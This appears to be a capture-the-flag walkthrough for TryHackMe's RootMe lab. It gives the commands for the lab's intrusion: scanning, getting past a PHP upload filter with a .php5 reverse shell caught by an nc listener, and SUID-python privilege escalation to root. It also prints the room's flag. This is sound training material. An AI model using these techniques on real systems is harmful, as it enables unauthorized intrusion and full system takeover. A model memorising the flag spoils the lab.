# RootMe-THM



RootMe Walkthrough (TryHackMe)
Basic Tools Recap
Catch a reverse shell:

 nc -lvnp <port>


Start a reverse shell: Pentestmonkey PHP reverse shell


Upgrade the shell:

 python3 -c 'import pty; pty.spawn("/bin/bash")'


Search for files by name:

 find / -type f -name "user.txt" 2>/dev/null


Search inside files:

 grep -rn "user.txt" / 2>/dev/null


Find SUID binaries:

 find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null



Reconnaissance
Run Nmap scan:
nmap -sC -sV 10.10.x.x

Open ports discovered:
22/tcp → SSH


80/tcp → HTTP


SSH is open but cannot be brute-forced. Web service is available on port 80.

Web Enumeration
Browse to port 80. Page source shows nothing useful.
Run Gobuster:
gobuster dir -u http://10.10.x.x -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

Directories found:
/panel


/uploads



Exploitation – File Upload
The /panel page allows uploads. PHP files are blocked, but .php5 is accepted.
Modify Pentestmonkey reverse shell from .php to .php5 and upload.
Start a listener:
nc -lvnp 4444

Trigger the shell by visiting:
http://10.10.x.x/uploads/reverse.php5

Shell is caught.

Upgrading the Shell
Upgrade the reverse shell:
python -c 'import pty; pty.spawn("/bin/bash")'


User Flag
Locate user flag:
find / -type f -name "user.txt" 2>/dev/null

Read the flag:
cat /home/<user>/user.txt


Privilege Escalation
Enumerate SUID binaries:
find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null

Python is listed as SUID.
Use GTFOBins exploit:
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'

Now root shell is obtained.

Root Flag
Navigate to root directory and read the flag:
cd /root
ls
cat root.txt

Flag obtained:
THM{pr1v1l3g3_3sc4l4t10n}
